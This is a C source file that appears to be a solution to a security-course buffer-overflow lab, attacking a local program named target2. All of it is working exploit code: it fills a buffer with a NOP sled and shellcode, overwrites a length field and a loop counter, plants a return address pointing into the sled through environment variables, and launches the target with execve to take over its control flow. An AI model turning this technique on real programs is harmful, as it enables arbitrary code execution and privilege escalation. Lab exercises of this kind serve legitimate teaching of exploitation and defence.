#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[6];

	// memory address between buff and len
	char buffer[400];
	char *nop = "\x90";
	char *newLen = "\x1d\x01";

	for (int i = 0; i < 213; i++)
		strcat(buffer, nop);
	strcat(buffer, shellcode); //up to buf[263]
	strcat(buffer, newLen);  // buf[264] = 4c, buf[265] = 01

	char return_addr[] = "\x86\xfd\x21\x30"; // addr where NOPs in buffer starts
	char *newI = "\x0c\x01"; // buf[267-269]

	// memory address between i+4 and return address stored at 0x3021fe98
	char gap[500];
	for (int i = 0; i < 8; i++)  // distance between i and ret
		strcat(gap, nop);
	strcat(gap, return_addr);  // buf[279]

	// arguments and envs
	args[0] = TARGET;
	args[1] = buffer;
	args[2] = NULL;

	env[0] = "\0\0";
	env[1] = newI;
	env[2] = "\0\0"; // buf[270-272]
	env[3] = gap; //buf[272-284]
	env[4] = "\0";
	env[5] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
